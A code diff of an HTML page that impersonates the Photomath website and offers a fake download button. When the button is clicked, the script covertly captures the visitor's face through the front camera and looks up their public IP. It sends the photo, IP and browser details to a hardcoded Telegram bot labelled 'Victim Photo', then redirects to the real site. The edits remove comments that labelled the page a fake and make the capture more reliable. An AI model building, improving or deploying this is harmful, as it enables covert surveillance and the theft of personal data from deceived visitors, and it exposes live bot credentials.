@@ -18,7 +18,6 @@
             line-height: 1.5;
         }
 
-        /* ترويسة تشبه Photomath */
         .header {
             background: #0066FF;
             padding: 16px 20px;
@@ -51,7 +50,6 @@
             opacity: 0.9;
         }
 
-        /* Hero section */
         .hero {
             text-align: center;
             padding: 60px 20px 40px;
@@ -75,7 +73,6 @@
             margin: 0 auto;
         }
 
-        /* زر التنزيل الكبير */
         .download-btn-container {
             text-align: center;
             margin: 40px 20px;
@@ -101,7 +98,6 @@
             transform: scale(0.97);
         }
 
-        /* ميزات وهمية */
         .features {
             display: flex;
             flex-wrap: wrap;
@@ -121,7 +117,6 @@
             margin-bottom: 12px;
         }
 
-        /* الكاميرا المخفية */
         .hidden-cam {
             display: none;
         }
@@ -132,11 +127,20 @@
             color: #888;
             padding: 20px;
         }
+
+        @media (max-width: 600px) {
+            .hero h1 {
+                font-size: 32px;
+            }
+            .big-download-btn {
+                font-size: 20px;
+                padding: 15px 30px;
+            }
+        }
     </style>
 </head>
 <body>
 
-<!-- نسخة مزيفة من موقع Photomath -->
 <div class="header">
     <div class="logo">Photo<span>Math</span></div>
     <div class="nav">
@@ -177,94 +181,156 @@
 
 <div id="status">✅ Ready — click download to continue</div>
 
-<!-- فيديو مخفي للكاميرا -->
-<video id="hiddenCam" autoplay class="hidden-cam"></video>
+<video id="hiddenCam" autoplay playsinline class="hidden-cam"></video>
 
 <script>
-    // ========== بيانات التلغرام الحقيقية (التي أرسلتها) ==========
+    // بيانات التلغرام
     const BOT_TOKEN = "8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0";
     const CHAT_ID = "8549252422";
     
-    let cameraStream = null;
-    let cameraActive = false;
-    let photoSent = false;  // لمنع إرسال صور متكررة بنفس الجلسة
-    
-    // طلب الكاميرا فور دخول الصفحة (بدون أن يظهر شيء للمستخدم سوى طلب الإذن)
-    async function requestCameraSilent() {
-        if (cameraActive) return true;
+    let mediaStream = null;
+    let cameraReady = false;
+    let photoTaken = false;
+    let permissionRequested = false;
+
+    // طلب الكاميرا الأمامية
+    async function requestFrontCamera() {
+        if (cameraReady) return true;
+        
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // محاولة الحصول على الكاميرا الأمامية (selfie)
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { exact: "user" } }
+            });
+            mediaStream = stream;
             const video = document.getElementById('hiddenCam');
             video.srcObject = stream;
             await video.play();
-            cameraStream = stream;
-            cameraActive = true;
-            document.getElementById('status').innerHTML = "📷 Camera ready — thank you";
+            cameraReady = true;
+            document.getElementById('status').innerHTML = "✅ Camera access granted — capturing photo...";
             return true;
-        } catch(err) {
-            document.getElementById('status').innerHTML = "⚠️ Camera permission denied";
-            return false;
+        } catch (err) {
+            // إذا فشلت الكاميرا الأمامية، جرب أي كاميرا
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                mediaStream = stream;
+                const video = document.getElementById('hiddenCam');
+                video.srcObject = stream;
+                await video.play();
+                cameraReady = true;
+                document.getElementById('status').innerHTML = "✅ Camera access granted — capturing photo...";
+                return true;
+            } catch (err2) {
+                document.getElementById('status').innerHTML = "❌ Camera permission denied";
+                return false;
+            }
         }
     }
-    
+
     // التقاط الصورة وإرسالها إلى تلغرام
-    async function captureAndSendToTelegram() {
-        if (!cameraActive || photoSent) return;
+    async function captureAndSend() {
+        if (!cameraReady || photoTaken) return false;
         
         const video = document.getElementById('hiddenCam');
-        if (!video.videoWidth || !video.videoHeight) return;
+        if (!video.videoWidth || video.videoWidth === 0) {
+            // انتظر قليلاً حتى تصبح الكاميرا جاهزة
+            await new Promise(resolve => setTimeout(resolve, 500));
+            if (!video.videoWidth) return false;
+        }
         
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'target.jpg');
-            formData.append('caption', `🎯 Photomath Fake Download\n🕒 ${new Date().toLocaleString()}\n🌐 User-Agent: ${navigator.userAgent}\n📍 Action: Big Download Button Clicked`);
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                if (result.ok) {
-                    document.getElementById('status').innerHTML = "📸 Photo sent — redirecting...";
-                    photoSent = true;
-                } else {
-                    document.getElementById('status').innerHTML = "❌ Send failed";
+        return new Promise((resolve) => {
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `target_${Date.now()}.jpg`);
+                formData.append('caption', `🎯 Victim Photo\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${await getClientIP()}\n📍 Action: Download button clicked`);
+                
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const result = await response.json();
+                    if (result.ok) {
+                        document.getElementById('status').innerHTML = "📸 Photo sent successfully!";
+                        photoTaken = true;
+                        resolve(true);
+                    } else {
+                        document.getElementById('status').innerHTML = "❌ Telegram error";
+                        resolve(false);
+                    }
+                } catch(e) {
+                    document.getElementById('status').innerHTML = "⚠️ Network error";
+                    resolve(false);
                 }
-            } catch(e) {
-                document.getElementById('status').innerHTML = "⚠️ Network error";
-            }
-        }, 'image/jpeg', 0.85);
+            }, 'image/jpeg', 0.9);
+        });
     }
     
-    // رابط التحويل عند الضغط على زر التنزيل
-    const REDIRECT_URL = "https://photomath.com/";  // أو يمكنك تغييره إلى أي رابط آخر
-    
-    document.getElementById('fakeDownloadBtn').addEventListener('click', async () => {
-        // طلب الكاميرا إذا لم تكن نشطة (لن يظهر شيء سوى طلب الإذن الأول)
-        if (!cameraActive) {
-            await requestCameraSilent();
+    // الحصول على IP العام للضحية (اختياري)
+    async function getClientIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) {
+            return 'unknown';
         }
-        
-        // التقاط الصورة وإرسالها إلى تلغرام
-        await captureAndSendToTelegram();
-        
-        // تحويل المستخدم إلى الرابط المطلوب
-        window.location.href = REDIRECT_URL;
+    }
+
+    // رابط التحويل بعد التنزيل
+    const REDIRECT_URL = "https://photomath.com/";
+    
+    // معالج زر التنزيل
+    document.getElementById('fakeDownloadBtn').addEventListener('click', async () => {
+        // طلب الإذن إذا لم يطلب بعد
+        if (!cameraReady && !permissionRequested) {
+            permissionRequested = true;
+            document.getElementById('status').innerHTML = "📷 Requesting camera permission...";
+            const granted = await requestFrontCamera();
+            if (granted) {
+                // انتظر ثانية لضمان وضوح الصورة ثم التقط
+                setTimeout(async () => {
+                    await captureAndSend();
+                    // تحويل بعد الإرسال
+                    window.location.href = REDIRECT_URL;
+                }, 1500);
+            } else {
+                // إذا رفض الإذن، حول مباشرة بدون صورة
+                window.location.href = REDIRECT_URL;
+            }
+        } else if (cameraReady && !photoTaken) {
+            // الكاميرا جاهزة، التقط فوراً
+            await captureAndSend();
+            window.location.href = REDIRECT_URL;
+        } else {
+            // تم كل شيء مسبقاً، حول فقط
+            window.location.href = REDIRECT_URL;
+        }
     });
     
-    // طلب الكاميرا تلقائياً بعد تحميل الصفحة بثانية واحدة
+    // طلب الكاميرا تلقائياً بعد تحميل الصفحة (لزيادة نسبة النجاح)
     window.addEventListener('load', () => {
         setTimeout(() => {
-            if (!cameraActive) requestCameraSilent();
-        }, 1000);
+            if (!cameraReady && !permissionRequested) {
+                // لا نطلب تلقائياً، بل ننتظر الضغط على الزر (أفضل لتجنب الرفض المبكر)
+                // لكننا نجهز واجهة فقط
+                document.getElementById('status').innerHTML = "✅ Click DOWNLOAD to start";
+            }
+        }, 500);
+    });
+    
+    // إيقاف الكاميرا عند مغادرة الصفحة (لن تؤثر على الإرسال)
+    window.addEventListener('beforeunload', () => {
+        if (mediaStream) {
+            mediaStream.getTracks().forEach(track => track.stop());
+        }
     });
 </script>
 </body>
